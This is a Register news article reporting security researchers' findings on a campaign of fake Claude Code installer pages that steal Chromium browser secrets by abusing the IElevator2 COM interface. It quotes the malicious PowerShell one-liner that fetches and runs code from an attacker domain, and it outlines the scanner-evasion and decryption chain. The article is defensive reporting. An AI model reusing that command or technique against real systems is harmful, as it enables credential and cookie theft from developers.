---
title: Cookie thieves caught stealing dev secrets via fake Claude Code installers
url: https://www.theregister.com/security/2026/05/11/cookie-thieves-caught-stealing-dev-secrets/5238248
source: www.theregister.com - Articles
date: 2026-05-11
fetch_date: 2026-05-12T05:39:14.316297
---

# Cookie thieves caught stealing dev secrets via fake Claude Code installers

[Jump to main content](#main)

Search

TOPICS

* Security
  + [All Security](/security)
  + [Cyber-crime](/cyber_crime)
  + [Patches](/patches)
  + [Research](/research)
  + [CSO](/cso)
* Off-Prem
  + [All Off-Prem](/off_prem)
  + [Edge + IoT](/edge_iot)
  + [Channel](/channel)
  + [PaaS + IaaS](/paas_iaas)
  + [SaaS](/saas)
* On-Prem
  + [All On-Prem](/on_prem)
  + [Systems](/systems)
  + [Storage](/storage)
  + [Networks](/networks)
  + [HPC](/hpc)
  + [Personal Tech](/personal_tech)
  + [Cx0](/cxo)
  + [Public Sector](/public-sector)
* Software
  + [All Software](/software)
  + [AI + ML](/ai_ml)
  + [Applications](/applications)
  + [Databases](/databases)
  + [DevOps](/devops)
  + [OSes](/oses)
  + [Virtualization](/virtualization)
* Offbeat
  + [All Offbeat](/offbeat)
  + [Columnists](/columnists)
  + [Science](/science)
  + [BOFH](/bofh)
  + [Legal](/legal)
  + [Bootnotes](/bootnotes)
  + [Site News](/site_news)
  + [About Us](https://www.theregister.com/about_us)

* Special Features
  + [All Special Features](/tag/special_features)
  + [HPE: AI Explainers](/explainer/ai-explainer)
  + [RSA Conference](/special_features/rsa)
  + [Agentic AI](/special_features/agentic_ai)
  + [The Future of the Datacenter](/special_features/future_of_the_datacenter)
  + [AWS:Reinvent](/special_features/aws_reinvent)
  + [Nvidia GTC](/special_features/nvidia_gtc)
  + [SC25](/special_features/2025_11_sycomp_supercomputing)
  + [Supercomputing Month](/special_features/2025_11_supercomputing_month)
* Vendor Voice
  + [All Vendor Voice](https://vendorvoice.theregister.com/)
  + [Infinidat](https://vendorvoice.theregister.com/infinidat/)
  + [Everpure](https://vendorvoice.theregister.com/everpure/)
  + [Rubrik](https://vendorvoice.theregister.com/rubrik/)
  + [Make it real with Capgemini and AWS](https://vendorvoice.theregister.com/aws_capgemini/)
  + [Money Movement Hub](https://vendorvoice.theregister.com/aws_fis/)
  + [ZTE](https://vendorvoice.theregister.com/zte_news_and_stories/)
  + [Nutanix: Scale Kubernetes. Not Chaos.](https://vendorvoice.theregister.com/nutantix_cloud_native_apps/)
  + [AWS New Horizon](https://vendorvoice.theregister.com/aws_new_horizon/)
* Resources
  + [Intelligence](https://intelligence.theregister.com)
  + [Webinars & Events](https://intelligence.theregister.com/events/list/)
  + [Newsletters](https://account.theregister.com/login?r=https%3A%2F%2Faccount.theregister.com%2Fedit%2Fnewsletter%2F)

Search

[![Go to frontpage. Logo, The Register](/view-resources/dachser2/public/theregister/logo.svg)](https://www.theregister.com)

[![Go to frontpage. Logo, The Register](/view-resources/dachser2/public/theregister/logo.svg)](https://www.theregister.com)

[![Go to frontpage. Logo, The Register](/view-resources/dachser2/public/theregister/logo.svg)](https://www.theregister.com)

* [Sign in](https://account.theregister.com/login)

* [Datacenter](/tag/datacenter)
* [Security](/security)
* [Microsoft](/tag/microsoft)
* [AWS](/tag/aws)
* [Developer](/tag/developer)
* [Open Source](/tag/open%20source)
* [IT Careers](/tag/tech%20jobs)
* [Columnists](/tag/columnists)
* [Who, Me?](/tag/who%20me)
* [On Call](/tag/on%20call/)

REG AD

Security

# Cookie thieves caught stealing dev secrets via fake Claude Code installers

New IElevator2 COM interface? No problem

Jessica Lyons
[Jessica
Lyons](https://www.theregister.com/author/jessica-lyons)

Published
mon 11 May 2026 // 21:21 UTC

An ongoing campaign steals developers’ secrets via fake Claude Code installers and other popular coding tools, according to Ontinue’s security researchers.

The lure - as with several other [infostealer attacks](https://www.theregister.com/security/2026/04/22/another-npm-supply-chain-worm-hits-dev-environments/5220989) [targeting developers](https://www.theregister.com/devops/2026/05/11/checkmarx-tackles-another-teampcp-intrusion-as-jenkins-plugin-sabotaged/5237780) over the [past several months](https://www.theregister.com/security/2026/05/01/ongoing-supply-chain-attacks-worm-into-sap-npm-packages/5228837) - mimics a legitimate one-line installer for an attacker-controlled command. In this case, the command is “irm https[:]//claude[.]ai/install.ps1 | iex”, and the lure replaced the destination host with “irm events[.]msft23[.]com | iex”.

The payload is unique, and doesn’t match up with any documented malware family. It does, however, wreak havoc on developers exfiltrating decrypted cookies, passwords, and payment methods from Chromium-based browsers such as Google Chrome, Microsoft Edge, Brave, Vivaldi, and Opera.

REG AD

## MORE CONTEXT

* [### Checkmarx tackles another TeamPCP intrusion as Jenkins plugin sabotaged](/devops/2026/05/11/checkmarx-tackles-another-teampcp-intrusion-as-jenkins-plugin-sabotaged/5237780)
* [### The never-ending supply chain attacks worm into SAP npm packages, other dev tools](/security/2026/05/01/ongoing-supply-chain-attacks-worm-into-sap-npm-packages/5228837)
* [### Worm rubs out competitor's malware, then takes control](/security/2026/05/08/worm-rubs-out-competitors-malware-then-takes-control/5237389)
* [### Google's fix for critical Gemini CLI bug might break your CI/CD pipelines](/patches/2026/04/30/google-fixes-cvss-100-vulnerability-in-gemini-cli/5225768)

According to the threat hunters who [documented](https://www.ontinue.com/resource/blog-behind-a-fake-claude-code-installer/) the new campaign on Monday: “We publish for peer correlation rather than attribution.”

REG AD

The attacks also abuses the IElevator2 COM interface. This is Chromium’s elevation service used to handle App-Bound Encryption (ABE), specifically for encrypting and decrypting sensitive user data like cookies and passwords.

Google introduced the new interface in January to protect Chromium-based browser data from cookie thieves, who used earlier [ABE bypass techniques](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) and commodity stealers that file-copied the SQLite databases holding cookies and saved passwords.

However, crafty crooks (and [security researchers](https://medium.com/%40xaitax/the-curious-case-of-the-cantankerous-com-decrypting-microsoft-edges-app-bound-encryption-266cc52bc417)) soon figured out workarounds to abuse IElevator2, as is the case with the newly spotted malware.

The attack runs across three domains, all registered within six days of each other in April, and all fronted through Cloudflare.

It relies on developers searching for “install claude code,” and selecting a sponsored result that leads to a lookalike Claude Code installation page.

The page downloads and executes Anthropic’s authentic installer - but as Ontinue’s team found, the malicious instruction isn’t stored in the file itself, but instead rendered into the HTML of the landing page.

“Automated scanners, URL reputation services, and any skeptical reviewer who simply curls the URL therefore observe clean PowerShell delivered from a Cloudflare-fronted domain bearing a valid Let’s Encrypt certificate,” the researchers wrote. “Victims, meanwhile, are presented with an entirely different command.”

The pasted command redirects victims to an obfuscated PowerShell loader that injects a native AEB helper into a live browser process. The helper’s “exclusive purpose,” we’re told, is to invoke the browser's IElevator2 COM interface and recover the App-Bound Encryption key.

REG AD

The helper formats a pipe to exfiltrate sensitive data using Chromium’s legitimate Mojo naming convention for IPC pipes. It then attempts to use IElevator2 to decrypt developer secrets, but it falls back to the legacy interface on the Elevation Service alongside the legacy IElevator if the new one doesn’t work.

Ontinue’s researchers published a full list of elevation-service identifiers, so be sure to check that out.

And after receiving the ABE key from the helper, the PowerShell loader decrypts the local browser databases and sends the stolen data to an attacker-controlled server via an in-mem...